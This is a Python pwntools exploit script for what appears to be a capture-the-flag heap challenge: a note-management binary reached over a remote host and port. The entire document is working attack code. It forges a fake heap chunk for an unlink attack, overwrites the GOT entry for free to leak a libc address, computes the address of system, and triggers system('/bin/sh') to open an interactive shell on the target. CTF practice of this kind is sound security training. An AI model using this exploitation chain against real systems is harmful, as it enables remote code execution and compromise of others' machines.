from pwn import *
#from LibcSearcher import LibcSearcher
from io_file import *
import binascii
import subprocess

file_crack = './pwn'
glibc = '/lib/x86_64-linux-gnu/libc.so.6'
domain_name = '8sdafgh.gamectf.com'
port = 35555
remo = 1
archive = 'amd64'

context(os='linux', arch=archive, log_level='debug')
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def one_gadget(filename):
  return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))

def complement_code_32(num):
    return num & 0xffffffff
def complement_code_64(num):
    return num & 0xffffffffffffffff

elf = ELF(file_crack)
if remo:
    n = remote(domain_name, port)
else:
    n = elf.process(env={'LD_PRELOAD':glibc})


def z():
    if remo == 0:
        gdb.attach(n, gdbscript= '''
            dir /usr/src/glibc/glibc-2.23/malloc
                   ''')
        pause()

def add(size, content):
    n.sendlineafter("4.Exit", "1")
    n.sendlineafter("Which kind of note do you want to add?", str(size))
    n.sendafter("Content:", content)
    n.recvuntil("finish!")

def free(size):
    n.sendlineafter("4.Exit", "2")
    n.sendlineafter("Which kind of note do you want to delete?", str(size))
    n.recvuntil("finish!")

def update(size, content):
    n.sendlineafter("4.Exit", "3")
    n.sendlineafter("Which kind of note do you want to update?", str(size))
    n.sendafter("Content:", content)
    n.recvuntil("finish!")


one_gadget_ = one_gadget(glibc)
log.info(map(lambda x: hex(x), one_gadget_))

#gdb.attach(n)
ptr = 0x6020d8

add(2, 'aaaa\n')
add(1, 'aaaa\n')
add(1, 'aaaa\n')
free(2)
add(1, 'aaaa\n')
add(1, 'aaaa\n')
log.info(hex(len(p64(0) + p64(0x21) + p64(ptr-0x18) + p64(ptr - 0x10) + p64(0x20) + p64(0x90) + '\xee' * 0x80 + p64(0) + p64(0x101) + '\xee' * 0xf0 + p64(0) + p64(0x50) + '\xee' * 0x40 + p64(0x50))))
# update(2,p64(0) + p64(0x21) + p64(ptr-0x18) + p64(ptr - 0x10) + p64(0x20) + p64(0x90) + '\xee' * 0x80 + p64(0) + p64(0x101) + '\xee' * 0xf0 + p64(0) + p64(0x51) + '\xee' * 0x40 + p64(0x50)  )


pay  = p64(0)          + p64(0x21)
pay += p64(ptr - 0x18) + p64(ptr - 0x10)
pay += p64(0x20)       + p64(0x210) + '\n'
update(2, pay)
free(1)

update(2, 'a' * 0x10 + p64(0x602020) + p64(elf.got['free']) + '\n')
update(2, p64(0x400740) + '\n')
#gdb.attach(n)
n.sendlineafter("4.Exit", "2")
n.sendlineafter("Which kind of note do you want to delete?", str(1))
n.recvline()
n.recvline()
n.recvline()
libc_base = u64(n.recvline()[:6].ljust(8, '\x00')) - 0x6f690
print hex(libc_base)
system = libc_base + 0x45390
update(2, p64(system) + '\n')
add(1, '/bin/sh\x00\n')
n.sendlineafter("4.Exit", "2")
n.sendlineafter("Which kind of note do you want to delete?", str(1))
n.interactive()

